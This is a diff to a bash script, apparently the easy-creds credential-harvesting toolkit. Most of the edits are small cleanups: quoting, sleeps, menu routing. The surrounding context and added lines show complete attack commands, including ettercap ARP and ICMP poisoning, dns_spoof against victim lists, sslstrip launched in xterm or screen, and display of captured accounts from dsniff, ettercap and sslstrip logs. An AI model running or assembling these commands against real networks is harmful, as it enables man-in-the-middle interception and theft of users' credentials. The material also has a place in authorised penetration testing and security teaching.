@@ -84,15 +84,16 @@ f_checkexit(){
 ##################################################
 f_Quit(){
 	echo -e "\n\n\e[1;33m[*] Please standby while we clean up your mess...\e[0m\n"
+	sleep 2
 
 	# The following will run regardless of attack selected
 	if [ -s /tmp/ec/tail.pid ]; then kill $(cat /tmp/ec/tail.pid); fi
 	if [ -s /tmp/ec/sslstrip.pid ]; then kill $(cat /tmp/ec/sslstrip.pid); fi
-	if [ ! -z $(pidof hamster) ]; then kill $(pidof hamster); fi
-	if [ ! -z $(pidof ferret) ]; then kill $(pidof ferret); fi
-	if [ ! -z $(pidof ettercap) ]; then kill $(pidof ettercap); fi
-	if [ ! -z $(pidof urlsnarf) ]; then kill $(pidof urlsnarf); fi
-	if [ ! -z $(pidof dsniff) ]; then kill $(pidof dsniff); fi
+	if [ ! -z "$(pidof hamster)" ]; then kill $(pidof hamster); fi
+	if [ ! -z "$(pidof ferret)" ]; then kill $(pidof ferret); fi
+	if [ ! -z "$(pidof ettercap)" ]; then kill $(pidof ettercap); fi
+	if [ ! -z "$(pidof urlsnarf)" ]; then kill $(pidof urlsnarf); fi
+	if [ ! -z "$(pidof dsniff)" ]; then kill $(pidof dsniff); fi
 	echo "0" > /proc/sys/net/ipv4/ip_forward
 
 	# The following will run for wireless AP attacks
@@ -473,9 +474,9 @@ f_ecap(){
 	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M icmp:${GATEMAC}/${GATEIP}" ;;
 	7) type="[tunnel]"
 	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${TUNIFACE} // //" ;;
-	8) type="[dns_spoof / arp]"
+	8) type="[dns_spoof:arp]"
 	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
-	9) type="[dns_spoof / arp]"
+	9) type="[dns_spoof:arp]"
 	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
 	esac
 
@@ -711,6 +712,8 @@ f_finalstage(){
 		  screen -dmS easy-creds -t sslstrip sslstrip -pfk -w ${logfldr}/${sslstripfilename}
 		elif [ "$offset" == "1" ]; then
 			y=$((${y}+${yoffset}))
+			xterm -geometry "${width}"x${height}-${x}+${y} -bg blue -fg white -T "SSLStrip" -e sslstrip -pfk -w ${logfldr}/${sslstripfilename} &
+		else
 			xterm -geometry "${width}"x${height}-${x}+${y} -bg blue -fg white -T "SSLStrip" -e sslstrip -pfk -w ${logfldr}/${sslstripfilename} &
 		fi
 	fi
@@ -1307,7 +1310,9 @@ f_SSLStrip(){
 	 xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat ${PWD}/strip-accts.txt &
 	else
 	 echo -e "\n\e[1;31m[-] Sorry no credentials captured...\e[0m"
+	 sleep 5
 	fi
+	f_DataReviewMenu
 }
 #######################################################
 f_dsniff(){
@@ -1330,6 +1335,7 @@ f_dsniff(){
 	else
 	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Dsniff Accounts" -e cat ${PWD}/dsniff-log.txt &
 	fi
+	f_DataReviewMenu
 }
 ##################################################
 f_EtterLog(){
@@ -1350,6 +1356,7 @@ f_EtterLog(){
 	else
 	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Ettercap Accounts" -e cat ${PWD}/etterlog.txt &
 	fi
+	f_DataReviewMenu
 }
 ##################################################
 f_freeradiuscreds(){
@@ -1388,7 +1395,7 @@ done
 
 echo -n -e "\n\e[1;33m[*] Your cracked credentials can be found at ${acreds}...\e[0m"
 sleep 5
-f_mainmenu
+f_DataReviewMenu
 }
 ##################################################
 #
